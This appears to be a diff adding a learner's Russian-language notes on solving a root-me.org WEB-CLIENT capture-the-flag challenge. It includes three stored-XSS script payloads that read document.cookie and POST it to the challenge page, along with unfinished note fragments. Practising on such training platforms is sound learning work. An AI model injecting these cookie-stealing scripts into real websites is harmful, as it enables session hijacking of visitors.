@@ -1,0 +1,78 @@
+---
+Ресурсы:
+
+// оф сайт
+- [ https://www.root-me.org ]
+  - залогинены как [ dscjncrbq@mail.ru ]
+
+---
+элементы документа 
+
+[?] - информация потенциально для многократного использования
+[!] - была ошибка, недочет, нашли решение 
+[*] - важное контекстное примечание 
+[#<имяТега>] - так можим выносить различного рода информацию, оставляя ссылку 
+
+---
+краткое описание 
+
+- [ https://www.root-me.org ] плащадка для тренировки взломов и проникновений
+
+
+
+1) выбираем категорию [ WEB-CLIENT ]
+  - можно редактировать код который мы получаем в браузере
+  - код может быть закодирован, надо гуглить как раскодировать
+    - если закодирован код, то можно вызвать [ .toString(); ]
+  
+2) делаем XCC атаку
+  - мееега интересная тема по внедрению всоего кода, для выполнения всеми кто откроет страничку
+  
+ 
+  <script> 
+    alert('работает наш скрипт');
+    var xhr = new XMLHttpRequest(); 
+    xhr.open('POST','http://challenge01.root-me.org/web-client/ch18/');
+
+    xhr.send("titre=DZhukov_titre:" + document.cookie + "&message=DZhukov_message:" + document.cookie);
+
+  </script>
+
+
+
+
+    <script> 
+    if(!"".localeCompare(document.cookie)) {
+
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', '', true); 
+      xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.setRequestHeader('Accept-Language','en-US,en;q=0.9');
+      xhr.send("titre=DZhukov_titre_&message=DZhukov_message_"); 
+
+    }
+
+  </script>
+
+
+
+
+    <script> var xhr = new XMLHttpRequest(); xhr.open('POST', '', true); xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); xhr.setRequestHeader('Accept-Language','en-US,en;q=0.9'); xhr.send("titre=DZhukov_titre_" + document.cookie + "&message=DZhukov_message_" + document.cookie); </script>
+
+
+- должен быть такой POST !
+http://challenge01.root-me.org/web-client/ch18/
+
+
+
+scri
+
+
+[?] как что то там
+
+ 
+// #
+#----------------------------------------------- 
+
+
+#----------------------------------------------- 
+ 
